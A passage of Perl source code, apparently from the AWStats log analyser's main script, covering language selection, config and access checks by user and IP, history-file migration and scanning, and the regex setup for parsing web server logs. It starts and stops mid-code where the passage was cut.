!$SiteConfig ) ) {\n\t&PrintCLIHelp();\n\texit 2;\n}\n$SiteConfig ||= &Sanitize( $ENV{'SERVER_NAME'} );\n\n#$ENV{'SERVER_NAME'}||=$SiteConfig;\t# For thoose who use __SERVER_NAME__ in conf file and use CLI.\n$ENV{'AWSTATS_CURRENT_CONFIG'} = $SiteConfig;\n\n# Read config file (SiteConfig must be defined)\n&Read_Config($DirConfig);\n\n# Check language\nif ( $QueryString =~ /(^|&|&amp;)lang=([^&]+)/i ) { $Lang = \"$2\"; }\nif ( !$Lang || $Lang eq 'auto' ) {    # If lang not defined or forced to auto\n\tmy $langlist = $ENV{'HTTP_ACCEPT_LANGUAGE'} || '';\n\t$langlist =~ s/;[^,]*//g;\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"Search an available language among HTTP_ACCEPT_LANGUAGE=$langlist\",\n\t\t\t1\n\t\t);\n\t}\n\tforeach my $code ( split( /,/, $langlist ) )\n\t{                                 # Search for a valid lang in priority\n\t\tif ( $LangBrowserToLangAwstats{$code} ) {\n\t\t\t$Lang = $LangBrowserToLangAwstats{$code};\n\t\t\tif ($Debug) { debug( \" Will try to use Lang=$Lang\", 1 ); }\n\t\t\tlast;\n\t\t}\n\t\t$code =~ s/-.*$//;\n\t\tif ( $LangBrowserToLangAwstats{$code} ) {\n\t\t\t$Lang = $LangBrowserToLangAwstats{$code};\n\t\t\tif ($Debug) { debug( \" Will try to use Lang=$Lang\", 1 ); }\n\t\t\tlast;\n\t\t}\n\t}\n}\nif ( !$Lang || $Lang eq 'auto' ) {\n\tif ($Debug) {\n\t\tdebug( \" No language defined or available. Will use Lang=en\", 1 );\n\t}\n\t$Lang = 'en';\n}\n\n# Check and correct bad parameters\n&Check_Config();\n\n# Now SiteDomain is defined\n\nif ( $Debug && !$DebugMessages ) {\n\terror(\n\"Debug has not been allowed. Change DebugMessages parameter in config file to allow debug.\"\n\t);\n}\n\n# Define frame name and correct variable for frames\nif ( !$FrameName ) {\n\tif (   $ENV{'GATEWAY_INTERFACE'}\n\t\t&& $UseFramesWhenCGI\n\t\t&& $HTMLOutput{'main'}\n\t\t&& !$PluginMode )\n\t{\n\t\t$FrameName = 'index';\n\t}\n\telse { $FrameName = 'main'; }\n}\n\n# Load Message files, Reference data files and Plugins\nif ($Debug) { debug( \"FrameName=$FrameName\", 1 ); }\nif ( $FrameName ne 'index' ) {\n\t&Read_Language_Data($Lang);\n\tif ( $FrameName ne 'mainleft' ) {\n\t\tmy %datatoload = ();\n\t\tmy (\n\t\t\t$filedomains, $filemime, $filerobots, $fileworms,\n\t\t\t$filebrowser, $fileos,   $filese\n\t\t  )\n\t\t  = (\n\t\t\t'domains',  'mime',\n\t\t\t'robots',   'worms',\n\t\t\t'browsers', 'operating_systems',\n\t\t\t'search_engines'\n\t\t  );\n\t\tmy ( $filestatushttp, $filestatussmtp ) =\n\t\t  ( 'status_http', 'status_smtp' );\n\t\tif ( $LevelForBrowsersDetection eq 'allphones' ) {\n\t\t\t$filebrowser = 'browsers_phone';\n\t\t}\n\t\tif ($UpdateStats) {    # If update\n\t\t\tif ($LevelForFileTypesDetection) {\n\t\t\t\t$datatoload{$filemime} = 1;\n\t\t\t}                  # Only if need to filter on known extensions\n\t\t\tif ($LevelForRobotsDetection) {\n\t\t\t\t$datatoload{$filerobots} = 1;\n\t\t\t}                  # ua\n\t\t\tif ($LevelForWormsDetection) {\n\t\t\t\t$datatoload{$fileworms} = 1;\n\t\t\t}                  # url\n\t\t\tif ($LevelForBrowsersDetection) {\n\t\t\t\t$datatoload{$filebrowser} = 1;\n\t\t\t}                  # ua\n\t\t\tif ($LevelForOSDetection) {\n\t\t\t\t$datatoload{$fileos} = 1;\n\t\t\t}                  # ua\n\t\t\tif ($LevelForRefererAnalyze) {\n\t\t\t\t$datatoload{$filese} = 1;\n\t\t\t}                  # referer\n\t\t\t                   # if (...) { $datatoload{'referer_spam'}=1; }\n\t\t}\n\t\tif ( scalar keys %HTMLOutput ) {    # If output\n\t\t\tif ( $ShowDomainsStats || $ShowHostsStats ) {\n\t\t\t\t$datatoload{$filedomains} = 1;\n\t\t\t} # TODO Replace by test if ($ShowDomainsStats) when plugins geoip can force load of domains datafile.\n\t\t\tif ($ShowFileTypesStats)  { $datatoload{$filemime}       = 1; }\n\t\t\tif ($ShowRobotsStats)     { $datatoload{$filerobots}     = 1; }\n\t\t\tif ($ShowWormsStats)      { $datatoload{$fileworms}      = 1; }\n\t\t\tif ($ShowBrowsersStats)   { $datatoload{$filebrowser}    = 1; }\n\t\t\tif ($ShowOSStats)         { $datatoload{$fileos}         = 1; }\n\t\t\tif ($ShowOriginStats)     { $datatoload{$filese}         = 1; }\n\t\t\tif ($ShowHTTPErrorsStats) { $datatoload{$filestatushttp} = 1; }\n\t\t\tif ($ShowSMTPErrorsStats) { $datatoload{$filestatussmtp} = 1; }\n\t\t}\n\t\t&Read_Ref_Data( keys %datatoload );\n\t}\n\t&Read_Plugins();\n}\n\n# Here charset is defined, so we can send the http header (Need BuildReportFormat,PageCode)\nif ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) {\n\thttp_head();\n}    # Run from a browser as CGI\n\n# Init other parameters\n$NBOFLINESFORBENCHMARK--;\nif ( $ENV{'GATEWAY_INTERFACE'} ) { $DirCgi = ''; }\nif ( $DirCgi && !( $DirCgi =~ /\\/$/ ) && !( $DirCgi =~ /\\\\$/ ) ) {\n\t$DirCgi .= '/';\n}\nif ( !$DirData || $DirData =~ /^\\./ ) {\n\tif ( !$DirData || $DirData eq '.' ) {\n\t\t$DirData = \"$DIR\";\n\t}    # If not defined or chosen to '.' value then DirData is current dir\n\telsif ( $DIR && $DIR ne '.' ) { $DirData = \"$DIR/$DirData\"; }\n}\n$DirData ||= '.';    # If current dir not defined then we put it to '.'\n$DirData =~ s/[\\\\\\/]+$//;\n\nif ( $FirstDayOfWeek == 1 ) { @DOWIndex = ( 1, 2, 3, 4, 5, 6, 0 ); }\nelse { @DOWIndex = ( 0, 1, 2, 3, 4, 5, 6 ); }\n\n# Should we link to ourselves or to a wrapper script\n$AWScript = ( $WrapperScript ? \"$WrapperScript\" : \"$DirCgi$PROG.$Extension\" );\nif (index($AWScript,'?')>-1) \n{\n    $AWScript .= '&amp;';   # $AWScript contains URL parameters\n}\nelse \n{\n    $AWScript .= '?';\n}\n\n\n# Print html header (Need HTMLOutput,Expires,Lang,StyleSheet,HTMLHeadSectionExpires defined by Read_Config, PageCode defined by Read_Language_Data)\nif ( !$HeaderHTMLSent ) { &html_head; }\n\n# AWStats output is replaced by a plugin output\nif ($PluginMode) {\n\n\t#\tmy $function=\"BuildFullHTMLOutput_$PluginMode()\";\n\t#\teval(\"$function\");\n\tmy $function = \"BuildFullHTMLOutput_$PluginMode\";\n\t&$function();\n\tif ( $? || $@ ) { error(\"$@\"); }\n\t&html_end(0);\n\texit 0;\n}\n\n# Security check\nif ( $AllowAccessFromWebToAuthenticatedUsersOnly && $ENV{'GATEWAY_INTERFACE'} )\n{\n\tif ($Debug) { debug( \"REMOTE_USER=\" . $ENV{\"REMOTE_USER\"} ); }\n\tif ( !$ENV{\"REMOTE_USER\"} ) {\n\t\terror(\n\"Access to statistics is only allowed from an authenticated session to authenticated users.\"\n\t\t);\n\t}\n\tif (@AllowAccessFromWebToFollowingAuthenticatedUsers) {\n\t\tmy $userisinlist = 0;\n\t\tmy $remoteuser   = quotemeta( $ENV{\"REMOTE_USER\"} );\n\t\t$remoteuser =~ s/\\s/%20/g\n\t\t  ; # Allow authenticated user with space in name to be compared to allowed user list\n\t\tmy $currentuser = qr/^$remoteuser$/i;    # Set precompiled regex\n\t\tforeach (@AllowAccessFromWebToFollowingAuthenticatedUsers) {\n\t\t\tif (/$currentuser/o) { $userisinlist = 1; last; }\n\t\t}\n\t\tif ( !$userisinlist ) {\n\t\t\terror(  \"User '\"\n\t\t\t\t  . $ENV{\"REMOTE_USER\"}\n\t\t\t\t  . \"' is not allowed to access statistics of this domain/config.\"\n\t\t\t);\n\t\t}\n\t}\n}\nif ( $AllowAccessFromWebToFollowingIPAddresses && $ENV{'GATEWAY_INTERFACE'} ) {\n\tmy $IPAddress     = $ENV{\"REMOTE_ADDR\"};                  # IPv4 or IPv6\n\tmy $useripaddress = &Convert_IP_To_Decimal($IPAddress);\n\tmy @allowaccessfromipaddresses =\n\t  split( /[\\s,]+/, $AllowAccessFromWebToFollowingIPAddresses );\n\tmy $allowaccess = 0;\n\tforeach my $ipaddressrange (@allowaccessfromipaddresses) {\n\t\tif ( $ipaddressrange !~\n\t\t\t/^(\\d+\\.\\d+\\.\\d+\\.\\d+)(?:-(\\d+\\.\\d+\\.\\d+\\.\\d+))*$/\n\t\t\t&& $ipaddressrange !~\n\t\t\t/^([0-9A-Fa-f]{1,4}:){1,7}(:|)([0-9A-Fa-f]{1,4}|\\/\\d)/ )\n\t\t{\n\t\t\terror(\n\"AllowAccessFromWebToFollowingIPAddresses is defined to '$AllowAccessFromWebToFollowingIPAddresses' but part of value does not match the correct syntax: IPv4AddressMin[-IPv4AddressMax] or IPv6Address[\\/prefix] in \\\"$ipaddressrange\\\"\"\n\t\t\t);\n\t\t}\n\n\t\t# Test ip v4\n\t\tif ( $ipaddressrange =~\n\t\t\t/^(\\d+\\.\\d+\\.\\d+\\.\\d+)(?:-(\\d+\\.\\d+\\.\\d+\\.\\d+))*$/ )\n\t\t{\n\t\t\tmy $ipmin = &Convert_IP_To_Decimal($1);\n\t\t\tmy $ipmax = $2 ? &Convert_IP_To_Decimal($2) : $ipmin;\n\n\t\t\t# Is it an authorized ip ?\n\t\t\tif ( ( $useripaddress >= $ipmin ) && ( $useripaddress <= $ipmax ) )\n\t\t\t{\n\t\t\t\t$allowaccess = 1;\n\t\t\t\tlast;\n\t\t\t}\n\t\t}\n\n\t\t# Test ip v6\n\t\tif ( $ipaddressrange =~\n\t\t\t/^([0-9A-Fa-f]{1,4}:){1,7}(:|)([0-9A-Fa-f]{1,4}|\\/\\d)/ )\n\t\t{\n\t\t\tif ( $ipaddressrange =~ /::\\// ) {\n\t\t\t\tmy @IPv6split = split( /::/, $ipaddressrange );\n\t\t\t\tif ( $IPAddress =~ /^$IPv6split[0]/ ) {\n\t\t\t\t\t$allowaccess = 1;\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t}\n\t\t\telsif ( $ipaddressrange == $IPAddress ) {\n\t\t\t\t$allowaccess = 1;\n\t\t\t\tlast;\n\t\t\t}\n\t\t}\n\t}\n\tif ( !$allowaccess ) {\n\t\terror( \"Access to statistics is not allowed from your IP Address \"\n\t\t\t  . $ENV{\"REMOTE_ADDR\"} );\n\t}\n}\nif (   ( $UpdateStats || $MigrateStats )\n\t&& ( !$AllowToUpdateStatsFromBrowser )\n\t&& $ENV{'GATEWAY_INTERFACE'} )\n{\n\terror(  \"\"\n\t\t  . ( $UpdateStats ? \"Update\" : \"Migrate\" )\n\t\t  . \" of statistics has not been allowed from a browser (AllowToUpdateStatsFromBrowser should be set to 1).\"\n\t);\n}\nif ( scalar keys %HTMLOutput && $MonthRequired eq 'all' ) {\n\tif ( !$AllowFullYearView ) {\n\t\terror(\n\"Full year view has not been allowed (AllowFullYearView is set to 0).\"\n\t\t);\n\t}\n\tif ( $AllowFullYearView < 3 && $ENV{'GATEWAY_INTERFACE'} ) {\n\t\terror(\n\"Full year view has not been allowed from a browser (AllowFullYearView should be set to 3).\"\n\t\t);\n\t}\n}\n\n#------------------------------------------\n# MIGRATE PROCESS (Must be after reading config cause we need MaxNbOf... and Min...)\n#------------------------------------------\nif ($MigrateStats) {\n\tif ($Debug) { debug( \"MigrateStats is $MigrateStats\", 2 ); }\n\tif ( $MigrateStats !~\n\t\t/^(.*)$PROG(\\d\\d)(\\d\\d\\d\\d)(\\d{0,2})(\\d{0,2})(.*)\\.txt$/ )\n\t{\n\t\terror(\n\"AWStats history file name must match following syntax: ${PROG}MMYYYY[.config].txt\",\n\t\t\t\"\", \"\", 1\n\t\t);\n\t}\n\t$DirData       = \"$1\";\n\t$MonthRequired = \"$2\";\n\t$YearRequired  = \"$3\";\n\t$DayRequired   = \"$4\";\n\t$HourRequired  = \"$5\";\n\t$FileSuffix    = \"$6\";\n\n\t# Correct DirData\n\tif ( !$DirData || $DirData =~ /^\\./ ) {\n\t\tif ( !$DirData || $DirData eq '.' ) {\n\t\t\t$DirData = \"$DIR\";\n\t\t}    # If not defined or chosen to '.' value then DirData is current dir\n\t\telsif ( $DIR && $DIR ne '.' ) { $DirData = \"$DIR/$DirData\"; }\n\t}\n\t$DirData ||= '.';    # If current dir not defined then we put it to '.'\n\t$DirData =~ s/[\\\\\\/]+$//;\n\tprint \"Start migration for file '$MigrateStats'.\";\n\tprint $ENV{'GATEWAY_INTERFACE'} ? \"<br />\\n\" : \"\\n\";\n\tif ($EnableLockForUpdate) { &Lock_Update(1); }\n\tmy $newhistory =\n\t  &Read_History_With_TmpUpdate( $YearRequired, $MonthRequired, $DayRequired,\n\t\t$HourRequired, 1, 0, 'all' );\n\tif ( rename( \"$newhistory\", \"$MigrateStats\" ) == 0 ) {\n\t\tunlink \"$newhistory\";\n\t\terror(\n\"Failed to rename \\\"$newhistory\\\" into \\\"$MigrateStats\\\".\\nWrite permissions on \\\"$MigrateStats\\\" might be wrong\"\n\t\t\t  . (\n\t\t\t\t$ENV{'GATEWAY_INTERFACE'} ? \" for a 'migration from web'\" : \"\"\n\t\t\t  )\n\t\t\t  . \" or file might be opened.\"\n\t\t);\n\t}\n\tif ($EnableLockForUpdate) { &Lock_Update(0); }\n\tprint \"Migration for file '$MigrateStats' successful.\";\n\tprint $ENV{'GATEWAY_INTERFACE'} ? \"<br />\\n\" : \"\\n\";\n\t&html_end(1);\n\texit 0;\n}\n\n# Output main frame page and exit. This must be after the security check.\nif ( $FrameName eq 'index' ) {\n\n\t# Define the NewLinkParams for main chart\n\tmy $NewLinkParams = ${QueryString};\n\t$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;\n\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t$NewLinkParams =~ s/^&amp;//;\n\t$NewLinkParams =~ s/&amp;$//;\n\tif ($NewLinkParams) { $NewLinkParams = \"${NewLinkParams}&amp;\"; }\n\n\t# Exit if main frame\n\tprint \"<frameset cols=\\\"$FRAMEWIDTH,*\\\">\\n\";\n\tprint \"<frame name=\\\"mainleft\\\" src=\\\"\"\n\t  . XMLEncode(\"$AWScript${NewLinkParams}framename=mainleft\")\n\t  . \"\\\" noresize=\\\"noresize\\\" frameborder=\\\"0\\\" />\\n\";\n\tprint \"<frame name=\\\"mainright\\\" src=\\\"\"\n\t  . XMLEncode(\"$AWScript${NewLinkParams}framename=mainright\")\n\t  . \"\\\" noresize=\\\"noresize\\\" scrolling=\\\"yes\\\" frameborder=\\\"0\\\" />\\n\";\n\tprint \"<noframes><body>\";\n\tprint \"Your browser does not support frames.<br />\\n\";\n\tprint \"You must set AWStats UseFramesWhenCGI parameter to 0\\n\";\n\tprint \"to see your reports.<br />\\n\";\n\tprint \"</body></noframes>\\n\";\n\tprint \"</frameset>\\n\";\n\t&html_end(0);\n\texit 0;\n}\n\n%MonthNumLib = (\n\t\"01\", \"$Message[60]\", \"02\", \"$Message[61]\", \"03\", \"$Message[62]\",\n\t\"04\", \"$Message[63]\", \"05\", \"$Message[64]\", \"06\", \"$Message[65]\",\n\t\"07\", \"$Message[66]\", \"08\", \"$Message[67]\", \"09\", \"$Message[68]\",\n\t\"10\", \"$Message[69]\", \"11\", \"$Message[70]\", \"12\", \"$Message[71]\"\n);\n\n# Build ListOfYears list with all existing years\n(\n\t$lastyearbeforeupdate, $lastmonthbeforeupdate, $lastdaybeforeupdate,\n\t$lasthourbeforeupdate, $lastdatebeforeupdate\n  )\n  = ( 0, 0, 0, 0, 0 );\nmy $datemask = '';\nif    ( $DatabaseBreak eq 'month' ) { $datemask = '(\\d\\d)(\\d\\d\\d\\d)'; }\nelsif ( $DatabaseBreak eq 'year' )  { $datemask = '(\\d\\d\\d\\d)'; }\nelsif ( $DatabaseBreak eq 'day' )   { $datemask = '(\\d\\d)(\\d\\d\\d\\d)(\\d\\d)'; }\nelsif ( $DatabaseBreak eq 'hour' )  {\n\t$datemask = '(\\d\\d)(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)';\n}\n\nif ($Debug) {\n\tdebug(\n\"Scan for last history files into DirData='$DirData' with mask='$datemask'\"\n\t);\n}\n\nmy $retval = opendir( DIR, \"$DirData\" );\nif(! $retval) \n{\n    error( \"Failed to open directory $DirData : $!\");\n}\nmy $regfilesuffix = quotemeta($FileSuffix);\nforeach ( grep /^$PROG$datemask$regfilesuffix\\.txt(|\\.gz)$/i,\n\tfile_filt sort readdir DIR )\n{\n\t/^$PROG$datemask$regfilesuffix\\.txt(|\\.gz)$/i;\n\tif ( !$ListOfYears{\"$2\"} || \"$1\" gt $ListOfYears{\"$2\"} ) {\n\n\t\t# ListOfYears contains max month found\n\t\t$ListOfYears{\"$2\"} = \"$1\";\n\t}\n\tmy $rangestring = ( $2 || \"\" ) . ( $1 || \"\" ) . ( $3 || \"\" ) . ( $4 || \"\" );\n\tif ( $rangestring gt $lastdatebeforeupdate ) {\n\n\t\t# We are on a new max for mask\n\t\t$lastyearbeforeupdate  = ( $2 || \"\" );\n\t\t$lastmonthbeforeupdate = ( $1 || \"\" );\n\t\t$lastdaybeforeupdate   = ( $3 || \"\" );\n\t\t$lasthourbeforeupdate  = ( $4 || \"\" );\n\t\t$lastdatebeforeupdate = $rangestring;\n\t}\n}\nclose DIR;\n\n# If at least one file found, get value for LastLine\nif ($lastyearbeforeupdate) {\n\n\t# Read 'general' section of last history file for LastLine\n\t&Read_History_With_TmpUpdate( $lastyearbeforeupdate, $lastmonthbeforeupdate,\n\t\t$lastdaybeforeupdate, $lasthourbeforeupdate, 0, 0, \"general\" );\n}\n\n# Warning if lastline in future\nif ( $LastLine > ( $nowtime + 20000 ) ) {\n\twarning(\n\"WARNING: LastLine parameter in history file is '$LastLine' so in future. May be you need to correct manually the line LastLine in some awstats*.$SiteConfig.conf files.\"\n\t);\n}\n\n# Force LastLine\nif ( $QueryString =~ /lastline=(\\d{14})/i ) {\n\t$LastLine = $1;\n}\nif ($Debug) {\n\tdebug(\"Last year=$lastyearbeforeupdate - Last month=$lastmonthbeforeupdate\");\n\tdebug(\"Last day=$lastdaybeforeupdate - Last hour=$lasthourbeforeupdate\");\n\tdebug(\"LastLine=$LastLine\");\n\tdebug(\"LastLineNumber=$LastLineNumber\");\n\tdebug(\"LastLineOffset=$LastLineOffset\");\n\tdebug(\"LastLineChecksum=$LastLineChecksum\");\n}\n\n# Init vars\n&Init_HashArray();\n\n#------------------------------------------\n# UPDATE PROCESS\n#------------------------------------------\nmy $lastlinenb         = 0;\nmy $lastlineoffset     = 0;\nmy $lastlineoffsetnext = 0;\nif ($Debug) { debug( \"UpdateStats is $UpdateStats\", 2 ); }\nif ( $UpdateStats && $FrameName ne 'index' && $FrameName ne 'mainleft' )\n{    # Update only on index page or when not framed to avoid update twice\n\n\tmy %MonthNum = (\n\t\t\"Jan\", \"01\", \"jan\", \"01\", \"Feb\", \"02\", \"feb\", \"02\", \"Mar\", \"03\",\n\t\t\"mar\", \"03\", \"Apr\", \"04\", \"apr\", \"04\", \"May\", \"05\", \"may\", \"05\",\n\t\t\"Jun\", \"06\", \"jun\", \"06\", \"Jul\", \"07\", \"jul\", \"07\", \"Aug\", \"08\",\n\t\t\"aug\", \"08\", \"Sep\", \"09\", \"sep\", \"09\", \"Oct\", \"10\", \"oct\", \"10\",\n\t\t\"Nov\", \"11\", \"nov\", \"11\", \"Dec\", \"12\", \"dec\", \"12\"\n\t  )\n\t  ; # MonthNum must be in english because used to translate log date in apache log files\n\n\tif ( !scalar keys %HTMLOutput ) {\n\t\tprint\n\"Create/Update database for config \\\"$FileConfig\\\" by AWStats version $VERSION\\n\";\n\t\tprint \"From data in log file \\\"$LogFile\\\"...\\n\";\n\t}\n\n\tmy $lastprocessedyear  = $lastyearbeforeupdate  || 0;\n\tmy $lastprocessedmonth = $lastmonthbeforeupdate || 0;\n\tmy $lastprocessedday   = $lastdaybeforeupdate   || 0;\n\tmy $lastprocessedhour  = $lasthourbeforeupdate  || 0;\n\tmy $lastprocesseddate  = '';\n\tif ( $DatabaseBreak eq 'month' ) {\n\t\t$lastprocesseddate =\n\t\t  sprintf( \"%04i%02i\", $lastprocessedyear, $lastprocessedmonth );\n\t}\n\telsif ( $DatabaseBreak eq 'year' ) {\n\t\t$lastprocesseddate = sprintf( \"%04i%\", $lastprocessedyear );\n\t}\n\telsif ( $DatabaseBreak eq 'day' ) {\n\t\t$lastprocesseddate = sprintf( \"%04i%02i%02i\",\n\t\t\t$lastprocessedyear, $lastprocessedmonth, $lastprocessedday );\n\t}\n\telsif ( $DatabaseBreak eq 'hour' ) {\n\t\t$lastprocesseddate = sprintf(\n\t\t\t\"%04i%02i%02i%02i\",\n\t\t\t$lastprocessedyear, $lastprocessedmonth,\n\t\t\t$lastprocessedday,  $lastprocessedhour\n\t\t);\n\t}\n\n\tmy @list;\n\n\t# Init RobotsSearchIDOrder required for update process\n\t@list = ();\n\tif ( $LevelForRobotsDetection >= 1 ) {\n\t\tforeach ( 1 .. $LevelForRobotsDetection ) { push @list, \"list$_\"; }\n\t\tpush @list, \"listgen\";    # Always added\n\t}\n\tforeach my $key (@list) {\n\t\tpush @RobotsSearchIDOrder, @{\"RobotsSearchIDOrder_$key\"};\n\t\tif ($Debug) {\n\t\t\tdebug(\n\t\t\t\t\"Add \"\n\t\t\t\t  . @{\"RobotsSearchIDOrder_$key\"}\n\t\t\t\t  . \" elements from RobotsSearchIDOrder_$key into RobotsSearchIDOrder\",\n\t\t\t\t2\n\t\t\t);\n\t\t}\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"RobotsSearchIDOrder has now \" . @RobotsSearchIDOrder . \" elements\",\n\t\t\t1\n\t\t);\n\t}\n\n\t# Init SearchEnginesIDOrder required for update process\n\t@list = ();\n\tif ( $LevelForSearchEnginesDetection >= 1 ) {\n\t\tforeach ( 1 .. $LevelForSearchEnginesDetection ) {\n\t\t\tpush @list, \"list$_\";\n\t\t}\n\t\tpush @list, \"listgen\";    # Always added\n\t}\n\tforeach my $key (@list) {\n\t\tpush @SearchEnginesSearchIDOrder, @{\"SearchEnginesSearchIDOrder_$key\"};\n\t\tif ($Debug) {\n\t\t\tdebug(\n\t\t\t\t\"Add \"\n\t\t\t\t  . @{\"SearchEnginesSearchIDOrder_$key\"}\n\t\t\t\t  . \" elements from SearchEnginesSearchIDOrder_$key into SearchEnginesSearchIDOrder\",\n\t\t\t\t2\n\t\t\t);\n\t\t}\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"SearchEnginesSearchIDOrder has now \"\n\t\t\t  . @SearchEnginesSearchIDOrder\n\t\t\t  . \" elements\",\n\t\t\t1\n\t\t);\n\t}\n\n\t# Complete HostAliases array\n\tmy $sitetoanalyze = quotemeta( lc($SiteDomain) );\n\tif ( !@HostAliases ) {\n\t\twarning(\n\"Warning: HostAliases parameter is not defined, $PROG choose \\\"$SiteDomain localhost 127.0.0.1\\\".\"\n\t\t);\n\t\tpush @HostAliases, qr/^$sitetoanalyze$/i;\n\t\tpush @HostAliases, qr/^localhost$/i;\n\t\tpush @HostAliases, qr/^127\\.0\\.0\\.1$/i;\n\t}\n\telse {\n\t\tunshift @HostAliases, qr/^$sitetoanalyze$/i;\n\t}    # Add SiteDomain as first value\n\n\t# Optimize arrays\n\t@HostAliases = &OptimizeArray( \\@HostAliases, 1 );\n\tif ($Debug) {\n\t\tdebug( \"HostAliases precompiled regex list is now @HostAliases\", 1 );\n\t}\n\t@SkipDNSLookupFor = &OptimizeArray( \\@SkipDNSLookupFor, 1 );\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\"SkipDNSLookupFor precompiled regex list is now @SkipDNSLookupFor\",\n\t\t\t1\n\t\t);\n\t}\n\t@SkipHosts = &OptimizeArray( \\@SkipHosts, 1 );\n\tif ($Debug) {\n\t\tdebug( \"SkipHosts precompiled regex list is now @SkipHosts\", 1 );\n\t}\n\t@SkipReferrers = &OptimizeArray( \\@SkipReferrers, 1 );\n\tif ($Debug) {\n\t\tdebug( \"SkipReferrers precompiled regex list is now @SkipReferrers\",\n\t\t\t1 );\n\t}\n\t@SkipUserAgents = &OptimizeArray( \\@SkipUserAgents, 1 );\n\tif ($Debug) {\n\t\tdebug( \"SkipUserAgents precompiled regex list is now @SkipUserAgents\",\n\t\t\t1 );\n\t}\n\t@SkipFiles = &OptimizeArray( \\@SkipFiles, $URLNotCaseSensitive );\n\tif ($Debug) {\n\t\tdebug( \"SkipFiles precompiled regex list is now @SkipFiles\", 1 );\n\t}\n\t@OnlyHosts = &OptimizeArray( \\@OnlyHosts, 1 );\n\tif ($Debug) {\n\t\tdebug( \"OnlyHosts precompiled regex list is now @OnlyHosts\", 1 );\n\t}\n\t@OnlyUsers = &OptimizeArray( \\@OnlyUsers, 1 );\n\tif ($Debug) {\n\t\tdebug( \"OnlyUsers precompiled regex list is now @OnlyUsers\", 1 );\n\t}\n\t@OnlyUserAgents = &OptimizeArray( \\@OnlyUserAgents, 1 );\n\tif ($Debug) {\n\t\tdebug( \"OnlyUserAgents precompiled regex list is now @OnlyUserAgents\",\n\t\t\t1 );\n\t}\n\t@OnlyFiles = &OptimizeArray( \\@OnlyFiles, $URLNotCaseSensitive );\n\tif ($Debug) {\n\t\tdebug( \"OnlyFiles precompiled regex list is now @OnlyFiles\", 1 );\n\t}\n\t@NotPageFiles = &OptimizeArray( \\@NotPageFiles, $URLNotCaseSensitive );\n\tif ($Debug) {\n\t\tdebug( \"NotPageFiles precompiled regex list is now @NotPageFiles\", 1 );\n\t}\n\n\t# Precompile the regex search strings with qr\n\t@RobotsSearchIDOrder        = map { qr/$_/i } @RobotsSearchIDOrder;\n\t@WormsSearchIDOrder         = map { qr/$_/i } @WormsSearchIDOrder;\n\t@BrowsersSearchIDOrder      = map { qr/$_/i } @BrowsersSearchIDOrder;\n\t@OSSearchIDOrder            = map { qr/$_/i } @OSSearchIDOrder;\n\t@SearchEnginesSearchIDOrder = map { qr/$_/i } @SearchEnginesSearchIDOrder;\n\tmy $miscquoted     = quotemeta(\"$MiscTrackerUrl\");\n\tmy $defquoted      = quotemeta(\"/$DefaultFile[0]\");\n\tmy $sitewithoutwww = lc($SiteDomain);\n\t$sitewithoutwww =~ s/www\\.//;\n\t$sitewithoutwww = quotemeta($sitewithoutwww);\n\n\t# Define precompiled regex\n\tmy $regmisc        = qr/^$miscquoted/;\n\tmy $regfavico      = qr/\\/favicon\\.ico$/i;\n\tmy $regrobot       = qr/\\/robots\\.txt$/i;\n\tmy $regtruncanchor = qr/#(\\w*)$/;\n\tmy $regtruncurl    = qr/([$URLQuerySeparators])(.*)$/;\n\tmy $regext         = qr/\\.(\\w{1,6})$/;\n\tmy $regdefault;\n\tif ($URLNotCaseSensitive) { $regdefault = qr/$defquoted$/i; }\n\telse { $regdefault = qr/$defquoted$/; }\n\tmy $regipv4           = qr/^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$/;\n\tmy $regipv4l          = qr/^::ffff:\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$/;\n\tmy $regipv6           = qr/^[0-9A-F]*:/i;\n\tmy $regveredge        = qr/edge\\/([\\d]+)/i;\n\tmy $regvermsie        = qr/msie([+_ ]|)([\\d\\.]*)/i;\n\t#my $regvermsie11      = qr/trident\\/7\\.\\d*\\;([+_ ]|)rv:([\\d\\.]*)/i;\n\tmy $regvermsie11      = qr/trident\\/7\\.\\d*\\;([a-zA-Z;+_ ]+|)rv:([\\d\\.]*)/i;\n\tmy $regvernetscape    = qr/netscape.?\\/([\\d\\.]*)/i;\n\tmy $regverfirefox     = qr/firefox\\/([\\d\\.]*)/i;\n\t# For Opera:\n\t# OPR/15.0.1266 means Opera 15 \n\t# Opera/9.80 ...... Version/12.16 means Opera 12.16\n\t# Mozilla/5.0 .... Opera 11.51 means Opera 11.51\n\tmy $regveropera = qr/opera\\/9\\.80\\s.+\\sversion\\/([\\d\\.]+)|ope?ra?[\\/\\s]([\\d\\.]+)/i;\n\tmy $regversafari      = qr/safari\\/([\\d\\.]*)/i;\n\tmy $regversafariver   = qr/version\\/([\\d\\.]*)/i;\n\tmy $regverchrome      = qr/chrome\\/([\\d\\.]*)/i;\n\tmy $regverkonqueror   = qr/konqueror\\/([\\d\\.]*)/i;\n\tmy $regversvn         = qr/svn\\/([\\d\\.]*)/i;\n\tmy $regvermozilla     = qr/mozilla(\\/|)([\\d\\.]*)/i;\n\tmy $regnotie          = qr/webtv|omniweb|opera/i;\n\tmy $regnotnetscape    = qr/gecko|compatible|opera|galeon|safari|charon/i;\n\tmy $regnotfirefox     = qr/flock/i;\n\tmy $regnotsafari      = qr/android|arora|chrome|shiira/i;\n\tmy $regreferer        = qr/^(\\w+):\\/\\/([^\\/:]+)(:\\d+|)/;\n\tmy $regreferernoquery = qr/^([^$URLQuerySeparators]+)/;\n\tmy $reglocal          = qr/^(www\\.|)$sitewithoutwww/i;\n\tmy $regget            = qr/get|out/i;\n\tmy $regsent           = qr/sent|put|in/i;\n\n\t# Define value of $pos_xxx, @fieldlib, $PerlParsingFormat\n\t&DefinePerlParsingFormat($LogFormat);\n\n\t# Load DNS Cache Files\n\t#------------------------------------------\n\tif ($DNSLookup) {\n\t\t&Read_DNS_Cache( \\%MyDNSTable, \"$DNSStaticCacheFile\", \"\", 1 )\n\t\t  ; # 